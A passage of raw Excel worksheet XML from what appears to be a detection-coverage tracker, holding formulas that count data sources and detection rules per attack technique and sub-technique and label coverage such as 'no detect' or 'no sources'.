      <c r="M442" s="9" cm="1">
        <f t="array" ref="M442">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>3</v>
      </c>
      <c r="N442" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O442" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P442" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S44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42" t="s">
        <v>368</v>
      </c>
      <c r="U442" t="s">
        <v>2153</v>
      </c>
      <c r="V442" t="s">
        <v>2154</v>
      </c>
      <c r="W442" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="443" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A443" t="s">
        <v>2151</v>
      </c>
      <c r="B443" t="s">
        <v>2155</v>
      </c>
      <c r="C443" t="s">
        <v>2156</v>
      </c>
      <c r="D443" t="s">
        <v>3</v>
      </c>
      <c r="E443" t="s">
        <v>2157</v>
      </c>
      <c r="F443" s="9">
        <f t="shared" si="6"/>
        <v>3</v>
      </c>
      <c r="G443" s="9" cm="1">
        <f t="array" ref="G443">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H443" s="9" t="str" cm="1">
        <f t="array" ref="H443">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I443" s="9" t="str" cm="1">
        <f t="array" ref="I443">IF(SUM(IF($C443=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C443=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J443" s="9" t="str" cm="1">
        <f t="array" ref="J44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43" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M443" s="9" cm="1">
        <f t="array" ref="M443">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N443" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O443" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P443" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S44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43" t="s">
        <v>386</v>
      </c>
      <c r="U443" t="s">
        <v>2158</v>
      </c>
      <c r="V443" t="s">
        <v>2159</v>
      </c>
      <c r="W443" t="b">
        <v>1</v>
      </c>
      <c r="X443" t="s">
        <v>2151</v>
      </c>
    </row>
    <row r="444" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A444" t="s">
        <v>2151</v>
      </c>
      <c r="B444" t="s">
        <v>2160</v>
      </c>
      <c r="C444" t="s">
        <v>2161</v>
      </c>
      <c r="D444" t="s">
        <v>3</v>
      </c>
      <c r="E444" t="s">
        <v>2157</v>
      </c>
      <c r="F444" s="9">
        <f t="shared" si="6"/>
        <v>3</v>
      </c>
      <c r="G444" s="9" cm="1">
        <f t="array" ref="G444">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H444" s="9" t="str" cm="1">
        <f t="array" ref="H444">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I444" s="9" t="str" cm="1">
        <f t="array" ref="I444">IF(SUM(IF($C444=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C444=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J444" s="9" t="str" cm="1">
        <f t="array" ref="J44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44" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M444" s="9" cm="1">
        <f t="array" ref="M444">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N444" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O444" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P444" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S44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44" t="s">
        <v>386</v>
      </c>
      <c r="U444" t="s">
        <v>2162</v>
      </c>
      <c r="V444" t="s">
        <v>2163</v>
      </c>
      <c r="W444" t="b">
        <v>1</v>
      </c>
      <c r="X444" t="s">
        <v>2151</v>
      </c>
    </row>
    <row r="445" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A445" t="s">
        <v>2151</v>
      </c>
      <c r="B445" t="s">
        <v>2164</v>
      </c>
      <c r="C445" t="s">
        <v>2165</v>
      </c>
      <c r="D445" t="s">
        <v>3</v>
      </c>
      <c r="E445" t="s">
        <v>2166</v>
      </c>
      <c r="F445" s="9">
        <f t="shared" si="6"/>
        <v>1</v>
      </c>
      <c r="G445" s="9" cm="1">
        <f t="array" ref="G445">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H445" s="9" t="str" cm="1">
        <f t="array" ref="H445">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I445" s="9" t="str" cm="1">
        <f t="array" ref="I445">IF(SUM(IF($C445=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C445=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J445" s="9" t="str" cm="1">
        <f t="array" ref="J44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45" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M445" s="9" cm="1">
        <f t="array" ref="M445">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N445" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O445" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P445" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S44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45" t="s">
        <v>658</v>
      </c>
      <c r="U445" t="s">
        <v>2167</v>
      </c>
      <c r="W445" t="b">
        <v>1</v>
      </c>
      <c r="X445" t="s">
        <v>2151</v>
      </c>
    </row>
    <row r="446" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A446" t="s">
        <v>2168</v>
      </c>
      <c r="B446" t="s">
        <v>2168</v>
      </c>
      <c r="C446" t="s">
        <v>35</v>
      </c>
      <c r="D446" t="s">
        <v>10</v>
      </c>
      <c r="E446" t="s">
        <v>2169</v>
      </c>
      <c r="F446" s="9">
        <f t="shared" si="6"/>
        <v>4</v>
      </c>
      <c r="G446" s="9" cm="1">
        <f t="array" ref="G446">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H446" s="9" cm="1">
        <f t="array" ref="H446">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>3</v>
      </c>
      <c r="I446" s="9" t="str" cm="1">
        <f t="array" ref="I446">IF(SUM(IF($C446=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C446=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J446" s="9" cm="1">
        <f t="array" ref="J44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446" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>3</v>
      </c>
      <c r="M446" s="9" cm="1">
        <f t="array" ref="M446">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>3</v>
      </c>
      <c r="N446" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O446" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P446" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S44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46" t="s">
        <v>368</v>
      </c>
      <c r="U446" t="s">
        <v>2170</v>
      </c>
      <c r="V446" t="s">
        <v>2171</v>
      </c>
      <c r="W446" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="447" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A447" t="s">
        <v>2168</v>
      </c>
      <c r="B447" t="s">
        <v>2172</v>
      </c>
      <c r="C447" t="s">
        <v>2173</v>
      </c>
      <c r="D447" t="s">
        <v>10</v>
      </c>
      <c r="E447" t="s">
        <v>1422</v>
      </c>
      <c r="F447" s="9">
        <f t="shared" si="6"/>
        <v>3</v>
      </c>
      <c r="G447" s="9" cm="1">
        <f t="array" ref="G447">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H447" s="9" t="str" cm="1">
        <f t="array" ref="H447">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I447" s="9" t="str" cm="1">
        <f t="array" ref="I447">IF(SUM(IF($C447=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C447=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J447" s="9" t="str" cm="1">
        <f t="array" ref="J44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47" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M447" s="9" cm="1">
        <f t="array" ref="M447">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N447" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O447" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P447" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S44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47" t="s">
        <v>368</v>
      </c>
      <c r="U447" t="s">
        <v>2174</v>
      </c>
      <c r="V447" t="s">
        <v>2175</v>
      </c>
      <c r="W447" t="b">
        <v>1</v>
      </c>
      <c r="X447" t="s">
        <v>2168</v>
      </c>
    </row>
    <row r="448" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A448" t="s">
        <v>2168</v>
      </c>
      <c r="B448" t="s">
        <v>2176</v>
      </c>
      <c r="C448" t="s">
        <v>2177</v>
      </c>
      <c r="D448" t="s">
        <v>10</v>
      </c>
      <c r="E448" t="s">
        <v>2178</v>
      </c>
      <c r="F448" s="9">
        <f t="shared" si="6"/>
        <v>2</v>
      </c>
      <c r="G448" s="9" cm="1">
        <f t="array" ref="G448">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H448" s="9" t="str" cm="1">
        <f t="array" ref="H448">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I448" s="9" t="str" cm="1">
        <f t="array" ref="I448">IF(SUM(IF($C448=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C448=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J448" s="9" t="str" cm="1">
        <f t="array" ref="J44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48" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M448" s="9" cm="1">
        <f t="array" ref="M448">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N448" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O448" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P448" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S44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48" t="s">
        <v>368</v>
      </c>
      <c r="U448" t="s">
        <v>2179</v>
      </c>
      <c r="V448" t="s">
        <v>2180</v>
      </c>
      <c r="W448" t="b">
        <v>1</v>
      </c>
      <c r="X448" t="s">
        <v>2168</v>
      </c>
    </row>
    <row r="449" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A449" t="s">
        <v>2168</v>
      </c>
      <c r="B449" t="s">
        <v>2181</v>
      </c>
      <c r="C449" t="s">
        <v>2182</v>
      </c>
      <c r="D449" t="s">
        <v>10</v>
      </c>
      <c r="E449" t="s">
        <v>2178</v>
      </c>
      <c r="F449" s="9">
        <f t="shared" si="6"/>
        <v>2</v>
      </c>
      <c r="G449" s="9" cm="1">
        <f t="array" ref="G449">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H449" s="9" t="str" cm="1">
        <f t="array" ref="H449">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I449" s="9" t="str" cm="1">
        <f t="array" ref="I449">IF(SUM(IF($C449=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C449=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J449" s="9" t="str" cm="1">
        <f t="array" ref="J44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49" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M449" s="9" cm="1">
        <f t="array" ref="M449">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N449" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O449" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P449" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S44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49" t="s">
        <v>368</v>
      </c>
      <c r="U449" t="s">
        <v>2183</v>
      </c>
      <c r="V449" t="s">
        <v>2184</v>
      </c>
      <c r="W449" t="b">
        <v>1</v>
      </c>
      <c r="X449" t="s">
        <v>2168</v>
      </c>
    </row>
    <row r="450" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A450" t="s">
        <v>2185</v>
      </c>
      <c r="B450" t="s">
        <v>2185</v>
      </c>
      <c r="C450" t="s">
        <v>89</v>
      </c>
      <c r="D450" t="s">
        <v>13</v>
      </c>
      <c r="E450" t="s">
        <v>2186</v>
      </c>
      <c r="F450" s="9">
        <f t="shared" ref="F450:F513" si="7">LEN(E450)-LEN(SUBSTITUTE(E450,",",""))+1</f>
        <v>5</v>
      </c>
      <c r="G450" s="9" cm="1">
        <f t="array" ref="G450">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H450" s="9" cm="1">
        <f t="array" ref="H450">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>2</v>
      </c>
      <c r="I450" s="9" t="str" cm="1">
        <f t="array" ref="I450">IF(SUM(IF($C450=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C450=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J450" s="9" cm="1">
        <f t="array" ref="J45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450" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>2</v>
      </c>
      <c r="M450" s="9" cm="1">
        <f t="array" ref="M450">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>2</v>
      </c>
      <c r="N450" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O450" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P450" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S45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50" t="s">
        <v>425</v>
      </c>
      <c r="U450" t="s">
        <v>2187</v>
      </c>
      <c r="V450" t="s">
        <v>2188</v>
      </c>
      <c r="W450" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="451" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A451" t="s">
        <v>2185</v>
      </c>
      <c r="B451" t="s">
        <v>2189</v>
      </c>
      <c r="C451" t="s">
        <v>2190</v>
      </c>
      <c r="D451" t="s">
        <v>13</v>
      </c>
      <c r="E451" t="s">
        <v>2186</v>
      </c>
      <c r="F451" s="9">
        <f t="shared" si="7"/>
        <v>5</v>
      </c>
      <c r="G451" s="9" cm="1">
        <f t="array" ref="G451">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H451" s="9" t="str" cm="1">
        <f t="array" ref="H451">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I451" s="9" t="str" cm="1">
        <f t="array" ref="I451">IF(SUM(IF($C451=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C451=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J451" s="9" t="str" cm="1">
        <f t="array" ref="J45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51" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M451" s="9" cm="1">
        <f t="array" ref="M451">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N451" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O451" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P451" s="14" t="str">
